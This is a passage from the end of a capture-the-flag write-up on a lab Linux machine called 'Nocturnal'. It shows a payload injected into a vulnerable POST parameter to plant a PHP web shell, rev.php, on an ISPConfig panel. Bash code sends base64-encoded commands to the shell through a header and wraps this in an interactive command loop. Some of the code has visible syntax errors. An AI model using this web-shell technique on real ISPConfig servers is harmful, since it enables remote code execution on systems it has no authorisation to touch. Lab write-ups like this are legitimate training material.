<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_image_28.png" alt="image.png" />
<br /><br />
Now, we can inject the payload in the vulnerable <code class="language-plaintext highlighter-rouge">records[\]</code> POST parameter
<br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_33a2d5ab_d502_4b18_aac1_d72cf4c07bca.png" alt="image.png" />
<br /><br />
The file is uploaded successfully, we can execute code sending requests to out malicious injection (<code class="language-plaintext highlighter-rouge">rev.php</code>) passing commands in <code class="language-plaintext highlighter-rouge">C</code> header 
<br /><br /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ENCODED</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"id"</span> | <span class="nb">base64</span> <span class="nt">-w0</span><span class="si">)</span>
<span class="nv">RESP</span><span class="o">=</span>%<span class="o">(</span>curl <span class="nt">-sk</span> <span class="nt">-H</span> <span class="s2">"C: </span><span class="nv">$ENCODED</span><span class="s2">"</span> <span class="s2">"http://127.0.0.1:8000/admin/rev.php"</span><span class="o">)</span>
<span class="nb">echo</span> <span class="nv">$RESP</span>
</code></pre></div></div>

<p><br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_f78240ef_fa79_477c_9fe3_07e1a660b7a3.png" alt="image.png" />
<br /><br />
Or automating a shell in bash
<br /><br /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">echo</span> <span class="nt">-en</span> <span class="s2">"ispconfig-shell# "</span>
	<span class="nb">read</span> <span class="nt">-r</span> CMD <span class="o">||</span> <span class="k">continue</span>
	<span class="o">[[</span> <span class="s2">"</span><span class="nv">$CMD</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">"exit"</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">break
	
	</span><span class="nv">ENCODED</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"id"</span> | <span class="nb">base64</span> <span class="nt">-w0</span><span class="si">)</span>
	<span class="nv">RESP</span><span class="o">=</span>%<span class="o">(</span>curl <span class="nt">-sk</span> <span class="nt">-H</span> <span class="s2">"C: </span><span class="nv">$ENCODED</span><span class="s2">"</span> <span class="s2">"http://127.0.0.1:8000/admin/rev.php"</span><span class="o">)</span>
	
	<span class="nv">PAYLOAD</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$RESP</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-ozP</span> <span class="s1">'(?&lt;=___)(.|\n)*?(?=___)'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\0'</span><span class="si">)</span>
	<span class="k">if</span> <span class="o">[[</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$PAYLOAD</span><span class="s2">"</span><span class="o">]]</span><span class="p">;</span> <span class="k">do
		</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$PAYLOAD</span><span class="s2">"</span>
	<span class="k">else
		</span><span class="nb">echo</span> <span class="s2">"[!] No output detected"</span>
	<span class="k">fi
	
	</span><span class="nb">echo</span> <span class="s2">""</span>
<span class="k">done</span>
	
</code></pre></div></div>

<p><br /><br />
<img src="/assets/images/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91_40fd6f42_d0fd_4b10_acc6_4abcccb0a23b.png" alt="image.png" />
<br /><br />
Machine pwned@!@!#</p>

<script src="/assets/js/matrix-overlay.js"></script>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />


</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'https://your-site-url/writeups/2025/08/17/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91.html';
     this.page.identifier = '/writeups/2025/08/17/3504a2b6-e9c0-430d-b937-f7ad30743c1c-export-7da3f4a5-05b5-4c03-83a8-e4e8d58e7c91';
     this.page.title = 'Nocturnal-Linux-Easy';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/writeups/2025/08/24/25394fcc-7e99-4c50-a851-13c850b39132-export-00214464-ccf0-40e0-91e1-e970405d3d75.html">
            TheFrizz-Windows-Medium
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/08/09/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4.html">
            University-Windows-Insane
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/08/04/d2fd2792-68e0-4168-9904-f90f3bf63609-export-0ee8c1a5-de29-43f8-b0f4-339fa55d28de.html">
            Code-Linux-Easy
          </a>
        </h3>
      </li>
    
  </ul>
</div>






<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
